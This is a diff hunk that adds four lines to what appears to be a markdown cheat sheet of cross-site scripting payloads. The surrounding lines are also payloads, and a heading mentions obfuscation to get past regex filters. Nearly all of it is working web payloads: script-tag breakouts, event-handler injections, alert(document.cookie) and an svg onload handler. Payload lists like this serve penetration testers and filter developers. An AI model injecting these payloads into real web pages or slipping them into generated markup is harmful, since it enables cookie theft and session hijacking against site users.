@@ -60,6 +60,10 @@ TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;
 </textarea><img src=x onerror=”var pop=’ALERT(document.cookie);’; eval(pop.toLowerCase());”
 </script><script>alert('xElkomy')</script>
 OnMoUsEoVeR=prompt(/hacked/)//
+<b onmouseover=alert('Wufff!')>click me!</b>
+"><script>propmt("mamunwhh")</script>
+"><script>alert(document.cookie)</script>
+/><svg src=x onload=confirm("1337");>
 ```
 
 ## XSS payload with Alert Obfuscation, for bypass RegEx filters
